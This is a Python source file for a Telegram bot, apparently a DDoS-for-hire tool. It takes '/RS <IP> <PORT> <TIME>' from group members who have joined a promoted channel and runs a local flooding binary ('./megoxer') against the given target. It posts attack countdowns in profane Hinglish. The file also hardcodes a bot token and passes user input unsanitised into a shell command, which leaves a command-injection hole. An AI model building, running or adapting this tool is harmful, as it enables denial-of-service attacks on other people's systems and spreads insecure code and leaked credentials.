#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# Telegram bot token (इसको `.env` में रखना सेफ रहेगा)
bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Global variables
is_attack_running = False
attack_end_time = None
update_thread = None

# Function to check if user is in channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['RS'])
def handle_attack(message):
    global is_attack_running, attack_end_time, update_thread
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **ABE CHUTIYE! YE BOT SIRF GROUP ME CHALTA HAI! BHAAG YAHA SE!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KAR BSDK, WARNA KUCH NAHI MILEGA!** {CHANNEL_USERNAME}")
        return

    # **अगर अटैक पहले से चल रहा है, तो टाइम अपडेट वाला मैसेज भेजो**
    if is_attack_running and attack_end_time:
        sent_msg = bot.send_message(message.chat.id, "⏳ **CHECK KAR RAHE HAIN BSDK...**")
        
        def update_check_status():
            while is_attack_running:
                remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
                if remaining_time <= 0:
                    bot.edit_message_text("✅ **ATTACK KHATAM BSDK! AB NAYA LAGA!**", message.chat.id, sent_msg.message_id)
                    return
                try:
                    bot.edit_message_text(
                        f"⏳ **ATTACK CHAL RAHA HAI BSDK! BAAKI TIME: {int(remaining_time)}s**",
                        message.chat.id,
                        sent_msg.message_id
                    )
                except:
                    pass  
                time.sleep(1)

        threading.Thread(target=update_check_status).start()
        return  

    # **अगर कोई अटैक नहीं चल रहा, तो नया अटैक स्टार्ट करो**  
    if len(command) != 4:
        bot.reply_to(message, "⚠️ **USAGE: /RS  <IP>  <PORT>  <TIME> **\n😎 **SAHI LIKH CHUTIYE! WARNA GAAND MAAR LENGE!**")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE! KITNA GANJA PHOONK RAHA HAI BSDK?**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **180 SEC SE ZYADA NAHI MILEGA! TERI MAA KO BHI NAHI!**")
        return

    # **Attack Confirm Message**
    sent_msg = bot.send_message(message.chat.id, f"""⚡ **ATTACK CONFIRMED CHUTIYE!**  
🎯 **TARGET:** `{target}`  
🔢 **PORT:** `{port}`  
⏳ **DURATION:** `{time_duration}s`  
🚀 **JA BETA, ATTACK CHALU HO GAYA!**""", parse_mode="Markdown")

    # **Attack शुरू होते ही Screenshot का मैसेज भेज**
    bot.send_message(message.chat.id, "📸 **ATTACK LAG GAYA BSDK! SCREENSHOT BHEJ AB!**")

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)

    def update_attack_status():
        while is_attack_running:
            remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
            if remaining_time <= 0:
                bot.edit_message_text("✅ **ATTACK KHATAM BSDK! AB SCREENSHOT BHEJ!** 📸", message.chat.id, sent_msg.message_id)
                is_attack_running = False
                return
            try:
                bot.edit_message_text(
                    f"""🔥 **ATTACK CHALU HAI BSDK!** 🔥  
🎯 **TARGET:** `{target}`  
🔢 **PORT:** `{port}`  
⏳ **BAAKI TIME:** `{int(remaining_time)}s`  
🚀 **GAAND MAT MARA , SCREENSHOT READY RAKH!**""",
                    message.chat.id,
                    sent_msg.message_id
                )
            except:
                pass  
            time.sleep(1)  # हर 1 सेकंड में अपडेट करेगा

    threading.Thread(target=update_attack_status).start()

    try:
        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA BSDK! TERI NASEEB HI KHARAB HAI!**")
        is_attack_running = False
        attack_end_time = None
        return

    is_attack_running = False
    attack_end_time = None

# Handle /check command
@bot.message_handler(commands=['check'])
def handle_check(message):
    if is_attack_running and attack_end_time:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"⏳ **GAAND MARA MAT BSDK, ATTACK CHAL RAHA HAI! BAAKI TIME: {int(remaining_time)}s**")
    else:
        bot.reply_to(message, "✅ **ATTACK KHATAM! AB NAYA LAGA CHUTIYE!**")

# Bot start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 OYE {user_name}! 🔥🌟  

🚀 **BSDK READY HO JAA!**  
💥 ATTACK KARNE KA FULL CHANCE HAI!  

🔗 **GROUP JOIN KAR WARNA BSDK BAN JAYEGA!**  
👉 [TELEGRAM GROUP](https://t.me/R_SDanger_op) 🚀🔥""" 
    
    bot.reply_to(message, response, parse_mode="Markdown")

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(1)